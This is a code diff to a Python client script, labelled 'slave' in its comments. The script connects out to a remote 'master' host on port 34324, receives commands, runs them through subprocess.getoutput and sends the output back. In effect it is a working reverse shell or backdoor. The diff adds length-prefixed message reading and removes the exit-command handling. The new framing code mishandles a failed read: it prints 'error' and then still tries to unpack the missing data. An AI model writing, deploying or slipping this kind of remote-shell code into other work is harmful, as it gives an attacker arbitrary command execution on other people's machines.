@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import struct
 
 # Create socket with socket class.
 slave = socket.socket()
@@ -15,21 +16,34 @@ port = 34324
 # command.
 slave.connect((host, port))
 
-while True:
-    # receive the command from the master machine.
-    # recv 1024 bytes from the master machine.
-    command = slave.recv(1024).decode()
-    print(command)
 
-    # If the command is exit, close the connection.
-    if command == "exit":
-        break
+while True:
+
+    def recvall(socket, n):
+        # Helper function to recv n bytes or return None if EOF is hit
+        data = bytearray()
+        while len(data) < n:
+            packet = socket.recv(n - len(data))
+            if not packet:
+                return None
+            data.extend(packet)
+        return data
+
+    # Read header message length
+    msglen = recvall(slave, 4) # 4 because of the 4-bytes size prefix
+    if not msglen:
+        print("error")
+    msglen = struct.unpack('>I', msglen)[0]
+
+    #Read the message
+    msg = recvall(slave, msglen)
 
     output  = "output:\n"
 
+    print(msglen, msg)
     # getoutput method executes the command and
     # returns the output.
-    output += subprocess.getoutput(command)
+    output += subprocess.getoutput(msg.decode('utf-8'))
 
     # Encode and send the output of the command to
     # the master machine.
@@ -37,5 +51,6 @@ while True:
 
 # close method closes the connection.
 slave.close()
+
 
 
